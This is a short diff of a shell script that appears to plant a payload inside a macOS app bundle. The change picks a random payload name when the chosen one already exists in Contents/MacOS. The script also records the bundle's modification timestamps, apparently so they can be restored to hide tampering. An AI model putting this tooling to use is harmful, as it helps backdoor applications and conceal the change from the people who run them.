@@ -9,7 +9,11 @@ else
 	if [ "$3" == "" ];then
 		PayloadName=$RANDOM
 	else
-		PayloadName="$3"
+		if [ -f "$TRUESRC/Contents/MacOS/$3" ];then
+			PayloadName=$RANDOM
+		else
+			PayloadName="$3"
+		fi
 	fi
 	LMTA=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC") && LMTC=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents") && LMTIP=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/Info.plist") && LMTEF=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS")
 	if [ "$4" == "" ];then
